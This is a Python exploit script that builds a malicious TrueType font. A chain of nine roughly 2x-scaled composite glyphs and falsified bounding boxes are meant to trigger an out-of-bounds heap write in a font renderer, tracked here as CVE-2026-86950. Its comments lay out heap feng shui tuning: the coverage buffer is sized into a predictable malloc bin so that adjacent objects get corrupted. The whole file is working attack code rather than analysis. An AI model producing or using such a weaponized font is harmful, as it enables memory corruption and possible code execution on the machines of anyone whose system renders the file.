#!/usr/bin/env python3
"""CVE-2026-86950 heap feng shui font generator.

Modified from the original gen_font.py to target the SMALL malloc bin
(~4KB coverage buffer) instead of LARGE (~66KB). This makes heap layout
predictable for adjacent-object corruption.

Key change: DX=2 → width_px≈1024 → buffer_size≈4160 bytes (SMALL bin)

Requires: pip install fonttools
"""
import sys
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

UPM   = 16384
N     = 9
SCALE = 32767 / 16384          # F2Dot14 max, ~1.99994

# DX=2: coverage buffer lands in SMALL malloc bin (~4160 bytes)
# This is the sweet spot for heap feng shui:
#   - SMALL magazine packs same-size allocations sequentially
#   - 4KB is a common CFData/NSData allocation size
#   - Adjacent objects are predictably placed
DX    = 2

# Trigger x-coordinate: controls WHERE the OOB write lands
# After 9 levels of ~2x scaling and Tf=1024/UPM=16384:
#   device_x = TRIGGER_X * 2^9 * 1024/16384 = TRIGGER_X * 32
#   For TRIGGER_X=32000: device_x = 1,024,000 → overflows in fixed point
TRIGGER_X = 32000

fb = FontBuilder(UPM, isTTF=True)
names = [".notdef", "leaf"] + [f"c{i}" for i in range(N - 1)] + ["A"]
fb.setupGlyphOrder(names)
fb.setupCharacterMap({ord("A"): "A"})

# leaf glyph:
#   contour 0: small rect sets bbox (controls coverage buffer size)
#   contour 1: 2-point line at TRIGGER_X (the sat/trunc mismatch trigger)
p = TTGlyphPen(None)
p.moveTo((0, 0));  p.lineTo((DX, 0));  p.lineTo((DX, 40));  p.lineTo((0, 40));  p.closePath()
p.moveTo((TRIGGER_X, 1));  p.lineTo((TRIGGER_X, 39));  p.closePath()
glyf = {"leaf": p.glyph()}

# .notdef (required by CoreGraphics)
p = TTGlyphPen(None)
p.moveTo((0, 0));  p.lineTo((1, 0));  p.lineTo((1, 1));  p.closePath()
glyf[".notdef"] = p.glyph()

# composite chain: A -> c7 -> c6 -> ... -> c0 -> leaf, each scaled by ~2x
gs = dict.fromkeys(names)
prev = "leaf"
for name in names[2:]:
    p = TTGlyphPen(gs)
    p.addComponent(prev, (SCALE, 0, 0, SCALE, 0, 0))
    glyf[name] = p.glyph()
    prev = name

fb.setupGlyf(glyf)
fb.setupHorizontalMetrics({n: (100, 0) for n in names})
fb.setupHorizontalHeader(ascent=100, descent=-100)
fb.setupOS2()
fb.setupNameTable({"familyName": "T", "styleName": "R"})
fb.setupPost()
fb.font["maxp"].maxComponentDepth = N
fb.font.recalcBBoxes = False
for g in glyf.values():
    g.xMin = g.yMin = 0; g.xMax = DX; g.yMax = 40
fb.font["head"].xMin = 0; fb.font["head"].xMax = DX
fb.font["head"].yMin = 0; fb.font["head"].yMax = 40

out = sys.argv[1] if len(sys.argv) > 1 else "feng_shui_trigger.ttf"
fb.save(out)
print(f"wrote {out}")
print(f"  DX={DX}, width_px≈{int(DX * 2**N)}, buffer≈{4*(int(DX * 2**N)+16)} bytes")
print(f"  trigger_x={TRIGGER_X}, composite levels={N}")
